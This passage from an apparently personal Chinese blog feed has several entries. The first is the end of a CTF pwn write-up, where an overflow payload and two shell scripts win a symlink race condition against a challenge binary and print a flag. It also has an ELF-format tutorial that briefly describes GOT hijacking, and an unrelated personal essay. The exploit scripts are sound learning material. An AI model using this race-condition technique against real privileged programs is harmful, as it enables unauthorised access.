class="hljs-string">&#x27;b&#x27;</span> * <span class="hljs-number">8</span> + p64(test.symbols[<span class="hljs-string">&#x27;showflag&#x27;</span>])<br><span class="hljs-keyword">open</span>(<span class="hljs-string">&#x27;big&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>).<span class="hljs-keyword">write</span>(payload)<br></code></pre></td></tr></table></figure><p>对应两个条件竞争的脚本为</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">➜  racetest <span class="hljs-built_in">cat</span> exp.sh    <br><span class="hljs-comment">#!/bin/sh</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> `<span class="hljs-built_in">seq</span> 500`<br><span class="hljs-keyword">do</span><br>    <span class="hljs-built_in">cp</span> small fake<br>    <span class="hljs-built_in">sleep</span> 0.000008<br>    <span class="hljs-built_in">rm</span> fake<br>    <span class="hljs-built_in">ln</span> -s big fake<br>    <span class="hljs-built_in">rm</span> fake<br><span class="hljs-keyword">done</span><br>➜  racetest <span class="hljs-built_in">cat</span> run.sh <br><span class="hljs-comment">#!/bin/sh</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> `<span class="hljs-built_in">seq</span> 1000`<br><span class="hljs-keyword">do</span><br>    ./test fake<br><span class="hljs-keyword">done</span><br></code></pre></td></tr></table></figure><p>其中 exp 用于来竞争在相应的窗口内删除 fake 文件，同时执行符号链接。run 用来执行程序。</p><h3 id="具体效果"><a href="#具体效果" class="headerlink" title="具体效果"></a>具体效果</h3><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs stata">➜  racetest (<span class="hljs-keyword">sh</span> exp.<span class="hljs-keyword">sh</span> &amp;) &amp;&amp; <span class="hljs-keyword">sh</span> <span class="hljs-keyword">run</span>.<span class="hljs-keyword">sh</span><br>[...]<br><span class="hljs-keyword">file</span> size is too large!!<br><span class="hljs-keyword">open</span> <span class="hljs-keyword">file</span> failed!!: <span class="hljs-keyword">No</span> such <span class="hljs-keyword">file</span> or directory<br><span class="hljs-keyword">open</span> <span class="hljs-keyword">file</span> failed!!: <span class="hljs-keyword">No</span> such <span class="hljs-keyword">file</span> or directory<br><span class="hljs-keyword">open</span> <span class="hljs-keyword">file</span> failed!!: <span class="hljs-keyword">No</span> such <span class="hljs-keyword">file</span> or directory<br><span class="hljs-keyword">open</span> <span class="hljs-keyword">file</span> failed!!: <span class="hljs-keyword">No</span> such <span class="hljs-keyword">file</span> or directory<br><span class="hljs-keyword">file</span> size is too large!!<br><span class="hljs-keyword">open</span> <span class="hljs-keyword">file</span> failed!!: <span class="hljs-keyword">No</span> such <span class="hljs-keyword">file</span> or directory<br><span class="hljs-keyword">open</span> <span class="hljs-keyword">file</span> failed!!: <span class="hljs-keyword">No</span> such <span class="hljs-keyword">file</span> or directory<br>flag&#123;race_condition_succeed!&#125;<br>[...]<br></code></pre></td></tr></table></figure><p>其中成功的关键在于对应的 <code>sleep</code> 的时间选择。</p>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ELF文件详细学习</title>
    <link href="/2023/10/11/ELF%E6%96%87%E4%BB%B6/"/>
    <url>/2023/10/11/ELF%E6%96%87%E4%BB%B6/</url>
    
    <content type="html"><![CDATA[<h2 id="ELF文件结构"><a href="#ELF文件结构" class="headerlink" title="ELF文件结构"></a>ELF文件结构</h2><h3 id="整体结构"><a href="#整体结构" class="headerlink" title="整体结构"></a>整体结构</h3><p>ELF文件在链接视图(.o)文件和执行视图(可执行文件)有所差别，见下图</p><p><img src="https://s1.imagehub.cc/images/2023/10/09/ELF.png" alt="ELF.png"></p><p>链接视图是以节（section）为单位，执行视图是以段（segment）为单位。</p><h3 id="ELF-Header"><a href="#ELF-Header" class="headerlink" title="ELF Header"></a>ELF Header</h3><h4 id="显示命令："><a href="#显示命令：" class="headerlink" title="显示命令："></a>显示命令：</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$</span><span class="language-bash">readelf -h &lt;ELF_file&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs shell">ELF Header:<br>  Magic:   7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00 <br>  Class:                             ELF64<br>  Data:                              2&#x27;s complement, little endian<br>  Version:                           1 (current)<br>  OS/ABI:                            UNIX - System V<br>  ABI Version:                       0<br>  Type:                              REL (Relocatable file)<br>  Machine:                           Advanced Micro Devices X86-64<br>  Version:                           0x1<br>  Entry point address:               0x0<br>  Start of program headers:          0 (bytes into file)<br>  Start of section headers:          832 (bytes into file)<br>  Flags:                             0x0<br>  Size of this header:               64 (bytes)<br>  Size of program headers:           0 (bytes)<br>  Number of program headers:         0<br>  Size of section headers:           64 (bytes)<br>  Number of section headers:         1<br>  Section header string table index: 1 &lt;corrupt: out of range&gt;<br></code></pre></td></tr></table></figure><p>7f 、45、4c、46分别对应ascii码的Del(删除)、字母E、字母L、字母F。这四个字节被称为ELF文件的魔数，操作系统在加载可执行文件时会确认魔数是否正确，如果不正确则拒绝加载。<br>第五个字节标识ELF文件是32位（01）还是64位（02）的。<br>第六个字节标识该ELF文件字节序是小端（01）还是大端（02）的。<br>第七个字节指示ELF文件的版本号，一般是01。<br>后九个字节ELF标准未做定义。一般为00.</p><p>ELF文件头定义了ELF魔数、文件机器字节长度、数据存储方式、版本、运行平台等一系列参数。</p><h4 id="详细结构"><a href="#详细结构" class="headerlink" title="详细结构:"></a>详细结构:</h4><p>ELF Header的详细结构定义如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> e_ident[EI_NIDENT];     <span class="hljs-comment">/* Magic number and other info */</span><br>    Elf64_Half    e_type;                 <span class="hljs-comment">/* Object file type */</span><br>    Elf64_Half    e_machine;              <span class="hljs-comment">/* Architecture */</span><br>    Elf64_Word    e_version;              <span class="hljs-comment">/* Object file version */</span><br>    Elf64_Addr    e_entry;                <span class="hljs-comment">/* Entry point virtual address */</span><br>    Elf64_Off     e_phoff;                <span class="hljs-comment">/* Program header table file offset */</span><br>    Elf64_Off     e_shoff;                <span class="hljs-comment">/* Section header table file offset */</span><br>    Elf64_Word    e_flags;                <span class="hljs-comment">/* Processor-specific flags */</span><br>    Elf64_Half    e_ehsize;               <span class="hljs-comment">/* ELF header size in bytes */</span><br>    Elf64_Half    e_phentsize;            <span class="hljs-comment">/* Program header table entry size */</span><br>    Elf64_Half    e_phnum;                <span class="hljs-comment">/* Program header table entry count */</span><br>    Elf64_Half    e_shentsize;            <span class="hljs-comment">/* Section header table entry size */</span><br>    Elf64_Half    e_shnum;                <span class="hljs-comment">/* Section header table entry count */</span><br>    Elf64_Half    e_shstrndx;             <span class="hljs-comment">/* Section header string table index */</span><br>&#125; Elf64_Ehdr; <br></code></pre></td></tr></table></figure><p><code>e_entry</code>：程序入口地址</p><p><code>e_ehsize</code>：ELF Header结构大小</p><p><code>e_phoff</code>、<code>e_phentsize</code>、<code>e_phnum</code>：描述Program Header Table的偏移、大小、结构。</p><p><code>e_shoff</code>、<code>e_shentsize</code>、<code>e_shnum</code>：描述Section Header Table的偏移、大小、结构。</p><p><code>e_shstrndx</code>：这一项描述的是字符串表在Section Header Table中的索引，值25表示的是Section Header Table中第25项是字符串表（String Table）</p><p>其中各个类型所占字节的大小</p><p><code>Elf64_Word</code> :4字节</p><p><code>Elf64_Off </code>：8字节</p><p><code> Elf64_Addr</code>：8字节</p><p><code>Elf64_Half </code>：２字节</p><p><code>Elf64_Xword</code>：８字节</p><h3 id="Section-Header-Table"><a href="#Section-Header-Table" class="headerlink" title="Section Header Table"></a>Section Header Table</h3><h4 id="显示命令"><a href="#显示命令" class="headerlink" title="显示命令:"></a>显示命令:</h4><p>段表是ELF除了文件以外的最重要结构体，它描述了ELF的各个段的信息，ELF文件的段结构就是由段表决定的。<strong>编译器、链接器和装载器都是依靠段表来定位和访问各个段的属性的。</strong>如上面ELF Header所示，段表在ELF文件中的位置由ELF文件头的<code>“e_shoff”</code>成员决定的。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$</span><span class="language-bash">readelf -S &lt;ELF_file&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs shell">Section Headers:<br>  [Nr] Name              Type             Address           Offset<br>       Size              EntSize          Flags  Link  Info  Align<br>  [ 0]                   NULL             0000000000000000  00000000<br>       0000000000000000  0000000000000000           0     0     0<br>  [ 1] .strtab           STRTAB           0000000000000000  00000280<br>       00000000000000bc  0000000000000000           0     0     1<br>  [ 2] .text                PROGBITS         0000000000000000  00000040<br>       000000000000003a  0000000000000000 WAX       0     0     16<br>  [ 3] .rela.text        RELA             0000000000000000  00000220<br>       0000000000000018  0000000000000018   I      12     2     8<br>  [ 4] data                PROGBITS         0000000000000000  0000007c<br>       0000000000000008  0000000000000000   A       0     0     4<br>  [ 5] .rodata.str1.1    PROGBITS         0000000000000000  00000084<br>       000000000000000b  0000000000000001 AMS       0     0     1<br>  [ 6] .bss              NOBITS           0000000000000000  00000090<br>       0000000000000004  0000000000000000  WA       0     0     4<br>  [ 7] .comment          PROGBITS         0000000000000000  00000090<br>       0000000000000026  0000000000000001  MS       0     0     1<br>  [ 8] .note.GNU-stack   PROGBITS         0000000000000000  000000b6<br>       0000000000000000  0000000000000000           0     0     1<br>  [ 9] .eh_frame         X86_64_UNWIND    0000000000000000  000000b8<br>       0000000000000078  0000000000000000   A       0     0     8<br>  [10] .rela.eh_frame    RELA             0000000000000000  00000238<br>       0000000000000048  0000000000000018   I      12     9     8<br>  [11] .llvm_addrsig     LOOS+0xfff4c03   0000000000000000  00000280<br>       0000000000000000  0000000000000000   E      12     0     1<br>  [12] .symtab           SYMTAB           0000000000000000  00000130<br>       00000000000000f0  0000000000000018  <br></code></pre></td></tr></table></figure><p>其中比较重要的段：</p><p><code>.text</code>段主要存储函数代码</p><p><code>.bss</code>段主要存储未初始化的全局变量以及局部静态变量</p><p><code>.rodata</code>:存储全局常量，字符串常量。</p><p><code>.data</code>:已初始化的全局变量和局部静态变量。</p><h4 id="详细结构："><a href="#详细结构：" class="headerlink" title="详细结构："></a>详细结构：</h4><p>Section Header table 本质上是<code>Elf64_Shdr</code> 结构体的数组,<code>Elf64_Shdr</code>的结构定义如下。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br>    Elf64_Word    sh_name;                <span class="hljs-comment">/* Section name (string tbl index) */</span><br>    Elf64_Word    sh_type;                <span class="hljs-comment">/* Section type */</span><br>    Elf64_Xword   sh_flags;               <span class="hljs-comment">/* Section flags */</span><br>    Elf64_Addr    sh_addr;                <span class="hljs-comment">/* Section virtual addr at execution */</span><br>    Elf64_Off     sh_offset;              <span class="hljs-comment">/* Section file offset */</span><br>    Elf64_Xword   sh_size;                <span class="hljs-comment">/* Section size in bytes */</span><br>    Elf64_Word    sh_link;                <span class="hljs-comment">/* Link to another section */</span><br>    Elf64_Word    sh_info;                <span class="hljs-comment">/* Additional section information */</span><br>    Elf64_Xword   sh_addralign;           <span class="hljs-comment">/* Section alignment */</span><br>    Elf64_Xword   sh_entsize;             <span class="hljs-comment">/* Entry size if section holds table */</span><br>&#125; Elf64_Shdr;<br></code></pre></td></tr></table></figure><p><code>sh_name</code>：表示section的名称。由于每个section名称的长度不相同，并且为了节约空间，于是就将所有section的名称都存放在一个特定的名叫.shstrtab的section中，所以这里的sh_name的值指的就是在这个特定section中的偏移量，通过它可以获得一个字符串，也就是所需要的section名。0值表示无名称，一般用于类型为SHT_NULL的section中。</p><p><code>sh_type</code>：表示section的类型。</p><p><code>sh_offset</code>表示该section在文件中的偏移量。</p><p><code>sh_size</code>该section的大小。</p><p><code>sh_link</code>、<code>sh_info</code>：如果该部分与链接相关，则“sh_link”和“sh_info”具有特殊的含义。</p><p><code>sh_addralign</code>：该部分在进程的虚拟地址空间中的对齐方式。</p><p><code>sh_entsize</code>：如果该部分包含表，如符号表、重新定位表，sh_entsize是表中每个条目的大小。</p><h4 id="strtab-section"><a href="#strtab-section" class="headerlink" title=".strtab section"></a>.strtab <strong>section</strong></h4><p>.strtab是字符串表，保存了节中用到所有的字符串，如下图所示，保存了所有的字符串，其他节通过索引偏移指定字符串的具体值</p><p><img src="https://s1.imagehub.cc/images/2023/10/11/strtab.png" alt="strtab.png"></p><p>可通过下面命令查询所有的字符串具体的偏移量。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$</span><span class="language-bash">readelf -p .strtab &lt;ELF_FILE&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://s1.imagehub.cc/images/2023/10/11/strtab_dump.png" alt="strtab_dump.png"></p><p>以.text段举例，如最开始命令所示，.text段在整体文件的偏移为0x40，.text section table在.strtab section table的后面，根据ELF table Header，每个section header为64字节，开始在832字节。所以.text section table的位置为 0x340(832字节)+0x40(64字节)*2 &#x3D; 0x3C0开始</p><p><img src="https://s1.imagehub.cc/images/2023/10/11/text_name.png" alt="text_name.png"></p><p>开始字段即为<code>sh_name</code>为06，即从.strtab段开头偏移6，查表可知偏移6即为.text字符串。此即为.strtab段的作用。</p><h4 id="symtab-section"><a href="#symtab-section" class="headerlink" title=".symtab section"></a>.symtab section</h4><h5 id="symbol介绍"><a href="#symbol介绍" class="headerlink" title="symbol介绍"></a>symbol介绍</h5><p>在 ELF（可执行和可链接格式）文件中，symbol起着重要作用。<br>此上下文中的symbol本质上是一个命名实体。它可以是一个变量，一个函数，<br>或程序中任何其他可识别的代码段。</p><p>在 ELF 文件中符号的主要作用包括</p><p>1.链接：符号允许链接器解析引用。当您想要构建程序时 对于多个源文件，每个 .c 文件都编译为单独的可重定位对象文件。 如果一个目标文件引用另一个目标文件中定义的函数或变量，它通过一个符号来实现。在链接阶段，链接器将解析这些符号，将对符号的每个引用替换为所引用实体的实际地址。</p><p>2.分析：symbol对于 objdump&#x2F;gdb&#x2F;ghidra 等分析工具至关重要，没有symbol的程序比有symbol的更难分析。</p><p>3.动态链接：symbol也用于动态链接，它们允许程序确定运行时要从动态加载的库中调用哪些函数或要使用的变量。</p><h5 id="常见symbol"><a href="#常见symbol" class="headerlink" title="常见symbol"></a>常见symbol</h5><p>每个对象文件都有自己的符号表 （.symtab），其中包含在<br>对象文件。符号表中的符号可以是以下类型之一：</p><ol><li>全局symbol：这些符号对其他对象文件和库可见，例如函数（’main’、’foo’）和全局变量。</li><li>外部symbol：这些符号在其他对象文件或库中定义，例如 libc 中的“printf”。<br>3.节名：这些符号总是由编译器和汇编器生成，用于标记节的开头。</li><li>局部symbol：这些符号仅对目标文件本身可见，例如静态函数和静态变量。<br>5.调试符号：这些符号由编译器和汇编器生成，用于调试，通常采用“DWARF”格式。</li></ol><h5 id="详细结构-1"><a href="#详细结构-1" class="headerlink" title="详细结构"></a>详细结构</h5><p>.symtab和Section Header Table一样，是一个存储<code>Elf64_Sym</code>结构体的数组。</p><p><code>Elf64_Sym</code>的具体结构如下。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br>    Elf64_Word    st_name;                <span class="hljs-comment">/* Symbol name (string tbl index) */</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> st_info;                <span class="hljs-comment">/* Symbol type and binding */</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> st_other;               <span class="hljs-comment">/* Symbol visibility */</span><br>    Elf64_Section st_shndx;               <span class="hljs-comment">/* Section index */</span><br>    Elf64_Addr    st_value;               <span class="hljs-comment">/* Symbol value */</span><br>    Elf64_Xword   st_size;                <span class="hljs-comment">/* Symbol size */</span><br>&#125; Elf64_Sym;<br><br></code></pre></td></tr></table></figure><p><code>st_name</code>:symbol的名字在.strtab段中的偏移。</p><p><code>st_shndx</code>:symbol段的索引。</p><p><code>st_info</code>:高4位表示 Symbol Binding，低4位表示 Symbol Type</p><p><code>st_value</code>:根据不同的上下文，有不同的定义.</p><p>1.对于 Relocatable file，如果 st_shndx 的值为 SHN_COMMON，那么 st_value 表示对齐约束。（上面 st_shndx &#x3D; SHN_COMMON 已经提及）<br>2.对于 Relocatable file，如果 st_shndx 的值为关联的 Section Header index，那么 st_value 表示从该 Section 起始位置开始的 offset。（上面 st_shndx &#x3D; Section Header index 已经提及）<br>3.对于 Executable file 和 Shared object file，st_value 则是已经计算好的虚存地址，这是为了方便 dynamic linker（动态链接器）</p><p><code>st_size</code>：表示 Symbol 的大小，例如数据对象占据多少字节。如果 Symbol 没有大小或者大小未知，则值为0。</p><p>可通过命令来查看所有的symbol。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$</span><span class="language-bash">readelf -s &lt;ELF_FILE&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://s1.imagehub.cc/images/2023/10/11/symbol.png" alt="symbol.png"></p><p>如上图所示即为各个symbol的详细信息。</p><h3 id="Program-Header-Table"><a href="#Program-Header-Table" class="headerlink" title="Program Header Table"></a>Program Header Table</h3><p>查看进程虚拟地址范围文件</p><p><code>/proc/&lt;pid&gt;/maps</code></p><p>ELF的Program Header Table用于描述ELF可执行文件的内存布局。</p><p>操作系统并不关心ELF部分的详细数据，它主要关心每个部分的权限：是否可读，可写，可执行。因此，一些具有相同权限的ELF部分的可以合并到一个segment中。</p><p>segment由链接器创建，描述segment的结构就是Program Header Table。只有ELF可执行文件和共享库才有Program Header Table，这是一个数组<code>Elf64_Phdr</code>结构，每个这样的结构定义一个segment。</p><h4 id="详细结构-2"><a href="#详细结构-2" class="headerlink" title="详细结构"></a>详细结构</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>    Elf64_Word    p_type;   <span class="hljs-comment">/* Segment type : LOAD / DYNAMIC / INTERP / ... */</span><br>    Elf64_Word    p_flags;  <span class="hljs-comment">/* Segment flags : R / W / X  */</span><br>    Elf64_Off     p_offset; <span class="hljs-comment">/* Segment file offset : Segment&#x27;s offset in the ELF file */</span><br>    Elf64_Addr    p_vaddr;  <span class="hljs-comment">/* Segment virtual address : Segment&#x27;s virtual address in the process&#x27;s virtual address space */</span><br>    Elf64_Addr    p_paddr;  <span class="hljs-comment">/* Segment physical address : same as virtual address in most cases */</span><br>    Elf64_Xword   p_filesz; <span class="hljs-comment">/* Segment size in file : Segment&#x27;s size in the ELF file */</span><br>    Elf64_Xword   p_memsz;  <span class="hljs-comment">/* Segment size in memory : Segment&#x27;s size in the process&#x27;s virtual address space */</span><br>    Elf64_Xword   p_align;  <span class="hljs-comment">/* Segment alignment : Segment&#x27;s alignment attribute, it p_align is 10, then the </span><br><span class="hljs-comment">                               segment&#x27;s address should be 2^10 aligned */</span><br>&#125; Elf64_Phdr;  <br></code></pre></td></tr></table></figure><p>详细的介绍已经在注释中写明。</p><h4 id="显示命令-1"><a href="#显示命令-1" class="headerlink" title="显示命令"></a>显示命令</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$</span><span class="language-bash">readelf -l &lt;ELF_file&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs shell">Elf file type is EXEC (Executable file)<br>Entry point 0x401690<br>There are 11 program headers, starting at offset 64<br><br>Program Headers:<br>  Type           Offset             VirtAddr           PhysAddr<br>                 FileSiz            MemSiz              Flags  Align<br>  LOAD           0x0000000000000000 0x0000000000400000 0x0000000000400000<br>                 0x0000000000000520 0x0000000000000520  R      0x1000<br>  LOAD           0x0000000000001000 0x0000000000401000 0x0000000000401000<br>                 0x0000000000074315 0x0000000000074315  R E     0x1000<br>  LOAD           0x0000000000076000 0x0000000000476000 0x0000000000476000<br>                 0x0000000000029133 0x0000000000029133  R      0x1000<br>  LOAD           0x000000000009f470 0x00000000004a0470 0x00000000004a0470<br>                 0x0000000000065620 0x000000000006ae98  RW     0x1000<br>  NOTE           0x00000000000002a8 0x00000000004002a8 0x00000000004002a8<br>                 0x0000000000000020 0x0000000000000020  R      0x8<br>  NOTE           0x00000000000002c8 0x00000000004002c8 0x00000000004002c8<br>                 0x0000000000000044 0x0000000000000044  R      0x4<br>  TLS            0x000000000009f470 0x00000000004a0470 0x00000000004a0470<br>                 0x0000000000000018 0x0000000000000058  R      0x8<br>  GNU_PROPERTY   0x00000000000002a8 0x00000000004002a8 0x00000000004002a8<br>                 0x0000000000000020 0x0000000000000020  R      0x8<br>  GNU_EH_FRAME   0x0000000000091960 0x0000000000491960 0x0000000000491960<br>                 0x0000000000002174 0x0000000000002174  R      0x4<br>  GNU_STACK      0x0000000000000000 0x0000000000000000 0x0000000000000000<br>                 0x0000000000000000 0x0000000000000000  RW     0x10<br>  GNU_RELRO      0x000000000009f470 0x00000000004a0470 0x00000000004a0470<br>                 0x0000000000063b90 0x0000000000063b90  R      0x1<br><br> Section to Segment mapping:<br>  Segment Sections...<br>   00     .note.gnu.property .note.gnu.build-id .note.ABI-tag .rela.plt <br>   01     .init .plt .text .fini <br>   02     .rodata .stapsdt.base rodata.cst32 .eh_frame_hdr .eh_frame .gcc_except_table <br>   03     .tdata .init_array .fini_array .data.rel.ro .got .got.plt .data .bss <br>   04     .note.gnu.property <br>   05     .note.gnu.build-id .note.ABI-tag <br>   06     .tdata .tbss <br>   07     .note.gnu.property <br>   08     .eh_frame_hdr <br>   09     <br>   10     .tdata .init_array .fini_array .data.rel.ro .got <br></code></pre></td></tr></table></figure><h4 id="plt表和got表"><a href="#plt表和got表" class="headerlink" title="plt表和got表"></a>plt表和got表</h4><p><img src="https://s1.imagehub.cc/images/2023/10/11/d03d5ab1f7ee16945a9d7da28888ba8f.png" alt="d03d5ab1f7ee16945a9d7da28888ba8f.png"></p><p>静态链接和动态链接的区别，静态链接在编译为可执行文件时将用户文件和库文件打包到一起，动态链接打包库函数寻址的程序片段，加载到内存空间后在再进行寻找。</p><p><strong>plt</strong>表是一个数组，数组中的每个元素都一个<strong>可执行的代码片段</strong>。数组中每个元素都与一个外部函数相对应（如strlen@plt。每当程序试图调用一个外部函数时，就会跳转到.plt表的对应代码片段，再由该代码片段跳转至对应函数。</p><p><strong>got.plt</strong> 表是一个数组，数组中的每个元素都一个地址。数组中每个元素都与一个外部函数相对应（如strlen@got）。每当程序试图调用一个外部函数时，.plt表的跳转地址正是来自于.got.plt表。</p><p>每当程序试图调用一个外部函数时，就会跳转到.plt表的对应代码片段，再由该代码片段跳转至目标函数。</p><h5 id="got表劫持"><a href="#got表劫持" class="headerlink" title="got表劫持"></a>got表劫持</h5><p>可以事先将got表中的函数地址改为后门函数地址当执行时plt表直接跳转到后门函数从而劫持获取权限。</p><p>通过命令即可查询到每个.plt表对应的got表。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$</span><span class="language-bash">objdump -d -j .plt /challenge/level41</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>开学前随笔</title>
    <link href="/2023/08/31/%E5%BC%80%E5%AD%A6%E5%89%8D%E9%9A%8F%E7%AC%94/"/>
    <url>/2023/08/31/%E5%BC%80%E5%AD%A6%E5%89%8D%E9%9A%8F%E7%AC%94/</url>
    
    <content type="html"><![CDATA[<p>现在是2023年的8月31日的深夜，可能写完这篇文章就进入9月了。</p><p>随着下午最后一把apex的结束，大家开始各忙各的，突然也反应过来，大学生活就这么结束了，再过几天就要开启研究生的生活了。</p><p>好在最后几个月没有疫情的大学生活也算过得充实，也过了一个可能是最后一个无忧无虑的暑假，就像小学初中一样。</p><p>毕业后先去了云南旅游，去了丽江，大理，腾冲。这是第一次去京津冀以外的地方，虽然很累但玩得也很开心，现在恍惚觉得，以后和同学们出去旅游这样的机会很少有了。</p><p>在云南最后几天得了肠胃炎，非常难受，回来后在家养病养了一段时间。</p><p>然后开始了减肥和推单机游戏。</p><p>到现在为止大概减了快10斤吧，虽然BMI还是肥胖，去云南的这一趟也让我知道了我的身体有多弱。</p><p>游戏推完了死亡搁浅，瓦国服开了蹭了蹭热度，打了打R6, 又推了推看门狗2还有老滚5，但没有推完，就像暑假也没有出来的CS2一样，充满了遗憾。</p><p>同时也学了学Golang,分布式系统，pwn的一些入门的东西，聊胜于无。</p><p>从这儿之后可能又要忙很长一段时间，感觉毕业后的时间过得好快。</p><p>哎，希望开学后的研究生生活能够一切顺利吧。</p>]]></content>
    
    
    <categories>
      
      <category>随笔</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>FastApi入门</title>
    <link href="/2023/05/21/FastAPI%E5%85%A5%E9%97%A8/"/>
    <url>/2023/05/21/FastAPI%E5%85%A5%E9%97%A8/</url>
    
